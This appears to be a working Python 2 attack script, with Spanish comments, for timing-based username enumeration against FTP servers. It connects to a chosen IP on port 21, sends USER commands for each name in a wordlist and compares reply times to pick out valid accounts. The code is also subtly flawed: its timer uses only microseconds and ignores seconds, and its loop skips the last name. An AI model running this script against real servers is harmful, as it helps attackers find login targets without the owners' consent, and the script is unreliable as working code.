#inspirado en https://www.exploit-db.com/exploits/581/
# -*- coding: utf-8 -*-

import socket
import ctypes

def gettimeofday():
	_gettimeofday = ctypes.cdll.LoadLibrary("libc.so.6").gettimeofday
	class timeval(ctypes.Structure):
		_fields_ = \
		[
		("tv_sec", ctypes.c_long),
		("tv_usec", ctypes.c_long)
		]
	tv=timeval()
	_gettimeofday(ctypes.byref(tv), None)
	
	return (float(tv.tv_usec) / 1000000)


if __name__ == "__main__":
	
	ip=raw_input('Ip: ')
	archivo=raw_input('Archivo con la lista de posibles usuarios: ')
	archivo = open(archivo)
	lineas = archivo.readlines()
	i=0
	s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,21))
	print ('Tiempo de Logueo: ')
	s.recv(1024)
	while i!=len(lineas) -1:
		print lineas[i]
		stat=0
		for y in range(0,8):
			aux1_seg=gettimeofday()
			s.send('USER '+lineas[i] +'\n')
			s.recv(1024)
			aux2_seg=gettimeofday()
			dist = aux2_seg-aux1_seg
			stat +=dist
			print (' '+str(dist))

		print ('  Avrg: '+str(stat/8))
		print (' ')
		i=i+1
